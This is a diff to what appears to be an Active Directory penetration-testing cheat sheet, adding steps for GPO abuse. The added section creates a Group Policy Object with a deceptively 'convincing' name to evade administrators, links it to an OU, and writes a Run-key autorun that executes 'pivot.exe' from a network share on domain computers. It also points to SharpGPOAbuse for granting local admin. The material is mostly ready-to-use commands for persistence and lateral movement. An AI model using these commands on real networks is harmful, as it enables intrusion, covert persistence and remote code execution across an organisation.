@@ -409,6 +409,20 @@ Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-
 Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner" -and $_.SecurityIdentifier -match "<DOMAIN SID>-[\d]{4,10}" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
 ```
 
+#### Create GPO and link to OU
+- Uses RSAT tools
+- OPSEC: The GPO will be visible in the Group Policy Management Console and other RSAT GPO tools, so make sure the name is "convincing".
+```
+New-GPO -Name "Testing GPO SMB security" | New-GPLink -Target "OU=<OU>,DC=<DOMAIN>,DC=<DOMAIN>"
+```
+
+#### Set autorun value
+- Uses RSAT tools
+- Best is to set the executable on a share in the domain
+```
+Set-GPPrefRegistryValue -Name "Testing GPO SMB security" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\<HOSTNAME>\<SHARE>\pivot.exe" -Type ExpandString
+```
+
 #### Add local admin abuse
 - https://github.com/FSecureLABS/SharpGPOAbuse
 ```
